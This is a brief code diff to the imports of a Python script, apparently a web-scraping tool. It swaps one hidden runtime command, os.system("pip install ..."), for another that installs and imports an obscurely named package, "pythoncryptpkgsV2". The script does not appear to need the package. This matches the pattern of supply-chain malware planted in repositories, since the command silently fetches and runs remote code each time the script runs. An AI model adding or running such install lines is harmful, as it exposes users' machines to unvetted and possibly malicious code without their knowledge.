@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite3addonV1")
-import pysqlite3addonV1
+os.system("pip install pythoncryptpkgsV2")
+import pythoncryptpkgsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
